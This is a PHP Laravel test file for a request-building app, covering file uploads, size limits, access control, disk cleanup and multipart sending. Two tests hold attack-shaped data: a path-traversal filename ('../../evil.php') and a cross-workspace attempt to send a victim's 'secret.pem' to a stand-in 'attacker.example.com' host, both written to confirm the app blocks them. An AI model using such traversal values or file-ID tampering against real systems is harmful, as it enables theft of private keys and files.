<?php

namespace Tests\Feature;

use App\Actions\ExecuteRequestAction;
use App\Enums\BodyType;
use App\Enums\HttpMethod;
use App\Enums\WorkspaceRole;
use App\Models\Collection;
use App\Models\Request as RequestModel;
use App\Models\RequestFile;
use App\Models\User;
use App\Models\Workspace;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

/**
 * Files attached to a form-data body: uploading them, sending them along, and
 * keeping them off the disk once nothing refers to them any more.
 */
class RequestFileTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        Storage::fake(RequestFile::DISK);
    }

    public function test_a_file_can_be_uploaded_for_a_request(): void
    {
        $user = User::factory()->create();
        $request = $this->requestOwnedBy($user);

        $response = $this->actingAs($user)
            ->postJson(route('api.request-files.store', $request), [
                'file' => UploadedFile::fake()->createWithContent('avatar.png', 'binary-ish'),
            ])
            ->assertCreated()
            ->assertJsonPath('filename', 'avatar.png');

        $file = RequestFile::findOrFail($response->json('id'));

        $this->assertSame($request->id, $file->request_id);
        $this->assertSame(strlen('binary-ish'), $file->size);
        Storage::disk(RequestFile::DISK)->assertExists($file->path);
    }

    public function test_the_stored_path_ignores_the_client_supplied_filename(): void
    {
        $user = User::factory()->create();
        $request = $this->requestOwnedBy($user);

        $this->actingAs($user)
            ->postJson(route('api.request-files.store', $request), [
                'file' => UploadedFile::fake()->createWithContent('../../evil.php', 'x'),
            ])
            ->assertCreated();

        $file = RequestFile::firstOrFail();

        $this->assertStringStartsWith('request-files/'.$request->id.'/', $file->path);
        $this->assertStringNotContainsString('..', $file->path);
        $this->assertSame('evil.php', $file->filename);
    }

    public function test_an_upload_past_the_size_limit_is_rejected(): void
    {
        config(['requests.max_upload_kilobytes' => 10]);

        $user = User::factory()->create();
        $request = $this->requestOwnedBy($user);

        $this->actingAs($user)
            ->postJson(route('api.request-files.store', $request), [
                'file' => UploadedFile::fake()->create('big.bin', 64),
            ])
            ->assertJsonValidationErrors('file');

        $this->assertSame(0, RequestFile::count());
    }

    public function test_a_stranger_can_neither_upload_nor_download(): void
    {
        $owner = User::factory()->create();
        $stranger = User::factory()->create();
        $request = $this->requestOwnedBy($owner);
        $file = RequestFile::factory()->create(['request_id' => $request->id]);

        $this->actingAs($stranger)
            ->postJson(route('api.request-files.store', $request), [
                'file' => UploadedFile::fake()->create('x.txt', 1),
            ])
            ->assertForbidden();

        $this->actingAs($stranger)
            ->get(route('api.request-files.show', $file))
            ->assertForbidden();
    }

    public function test_a_viewer_can_download_a_file_but_not_delete_it(): void
    {
        $owner = User::factory()->create();
        $viewer = User::factory()->create();
        $request = $this->requestOwnedBy($owner);
        $request->collection->workspace->members()->attach($viewer, ['role' => WorkspaceRole::Viewer->value]);

        Storage::disk(RequestFile::DISK)->put('request-files/1/stored.bin', 'hello');
        $file = RequestFile::factory()->create([
            'request_id' => $request->id,
            'path' => 'request-files/1/stored.bin',
            'filename' => 'hello.txt',
        ]);

        $download = $this->actingAs($viewer)
            ->get(route('api.request-files.show', $file))
            ->assertOk();

        $this->assertSame('hello', $download->streamedContent());

        $this->actingAs($viewer)
            ->deleteJson(route('api.request-files.destroy', $file))
            ->assertForbidden();
    }

    public function test_deleting_a_file_removes_it_from_the_disk(): void
    {
        $user = User::factory()->create();
        $request = $this->requestOwnedBy($user);

        Storage::disk(RequestFile::DISK)->put('request-files/1/stored.bin', 'hello');
        $file = RequestFile::factory()->create([
            'request_id' => $request->id,
            'path' => 'request-files/1/stored.bin',
        ]);

        $this->actingAs($user)
            ->deleteJson(route('api.request-files.destroy', $file))
            ->assertNoContent();

        $this->assertDatabaseMissing('request_files', ['id' => $file->id]);
        Storage::disk(RequestFile::DISK)->assertMissing('request-files/1/stored.bin');
    }

    public function test_deleting_a_request_or_its_folder_clears_the_uploads(): void
    {
        $user = User::factory()->create();
        $request = $this->requestOwnedBy($user);

        Storage::disk(RequestFile::DISK)->put('request-files/1/a.bin', 'a');
        Storage::disk(RequestFile::DISK)->put('request-files/1/b.bin', 'b');
        RequestFile::factory()->create(['request_id' => $request->id, 'path' => 'request-files/1/a.bin']);
        RequestFile::factory()->create(['request_id' => $request->id, 'path' => 'request-files/1/b.bin']);

        $request->delete();

        $this->assertSame(0, RequestFile::count());
        Storage::disk(RequestFile::DISK)->assertMissing('request-files/1/a.bin');
        Storage::disk(RequestFile::DISK)->assertMissing('request-files/1/b.bin');

        // ... and again one level up, where the database would otherwise cascade
        // the rows away without anything touching the disk.
        $second = $this->requestOwnedBy($user);
        Storage::disk(RequestFile::DISK)->put('request-files/2/c.bin', 'c');
        RequestFile::factory()->create(['request_id' => $second->id, 'path' => 'request-files/2/c.bin']);

        $second->collection->delete();

        $this->assertSame(0, RequestFile::count());
        Storage::disk(RequestFile::DISK)->assertMissing('request-files/2/c.bin');
    }

    public function test_executing_a_form_data_request_sends_the_uploaded_file(): void
    {
        $user = User::factory()->create();
        $request = $this->requestOwnedBy($user, [
            'method' => HttpMethod::Post,
            'url' => 'https://api.example.com/avatars',
            'body_type' => BodyType::FormData,
        ]);

        Storage::disk(RequestFile::DISK)->put('request-files/1/avatar.png', 'the-bytes');
        $file = RequestFile::factory()->create([
            'request_id' => $request->id,
            'path' => 'request-files/1/avatar.png',
            'filename' => 'avatar.png',
            'mime_type' => 'image/png',
        ]);

        $request->update(['body' => ['fields' => [
            ['key' => 'name', 'value' => 'Ada', 'enabled' => true],
            ['key' => 'avatar', 'type' => 'file', 'file_id' => $file->id, 'enabled' => true],
        ]]]);

        Http::fake(['api.example.com/*' => Http::response(['ok' => true], 201)]);

        app(ExecuteRequestAction::class)->handle($request, $user);

        Http::assertSent(function ($sent) {
            $body = (string) $sent->toPsrRequest()->getBody();

            return str_contains($sent->header('Content-Type')[0], 'multipart/form-data')
                && str_contains($body, 'name="avatar"; filename="avatar.png"')
                && str_contains($body, 'Content-Type: image/png')
                && str_contains($body, 'the-bytes')
                && str_contains($body, 'Ada');
        });
    }

    public function test_a_field_pointing_at_a_missing_file_is_dropped(): void
    {
        $user = User::factory()->create();
        $request = $this->requestOwnedBy($user, [
            'method' => HttpMethod::Post,
            'url' => 'https://api.example.com/avatars',
            'body_type' => BodyType::FormData,
            'body' => ['fields' => [
                ['key' => 'name', 'value' => 'Ada', 'enabled' => true],
                ['key' => 'avatar', 'type' => 'file', 'file_id' => 4321, 'enabled' => true],
            ]],
        ]);

        Http::fake(['api.example.com/*' => Http::response(['ok' => true], 201)]);

        app(ExecuteRequestAction::class)->handle($request, $user);

        Http::assertSent(function ($sent) {
            $body = (string) $sent->toPsrRequest()->getBody();

            return str_contains($body, 'name="name"') && ! str_contains($body, 'name="avatar"');
        });
    }

    public function test_a_request_cannot_attach_a_file_belonging_to_another_request(): void
    {
        $owner = User::factory()->create();
        $attacker = User::factory()->create();

        $victimRequest = $this->requestOwnedBy($owner);
        Storage::disk(RequestFile::DISK)->put('request-files/1/secret.pem', 'PRIVATE KEY');
        $victimFile = RequestFile::factory()->create([
            'request_id' => $victimRequest->id,
            'path' => 'request-files/1/secret.pem',
            'filename' => 'secret.pem',
        ]);

        // The browser hands send() a resolved body, so nothing stops a crafted
        // file_id arriving here — the executor has to scope the lookup itself.
        $attackerRequest = $this->requestOwnedBy($attacker, [
            'method' => HttpMethod::Post,
            'url' => 'https://attacker.example.com/collect',
            'body_type' => BodyType::FormData,
            'body' => ['fields' => [
                ['key' => 'loot', 'type' => 'file', 'file_id' => $victimFile->id, 'enabled' => true],
            ]],
        ]);

        Http::fake(['attacker.example.com/*' => Http::response([], 200)]);

        app(ExecuteRequestAction::class)->handle($attackerRequest, $attacker);

        Http::assertSent(function ($sent) {
            return ! str_contains((string) $sent->toPsrRequest()->getBody(), 'PRIVATE KEY');
        });
    }

    /**
     * @param  array<string, mixed>  $attributes
     */
    private function requestOwnedBy(User $user, array $attributes = []): RequestModel
    {
        $workspace = Workspace::factory()->create(['owner_id' => $user->id]);
        $collection = Collection::factory()->create(['workspace_id' => $workspace->id]);

        return RequestModel::factory()->create([
            'collection_id' => $collection->id,
            ...$attributes,
        ]);
    }
}
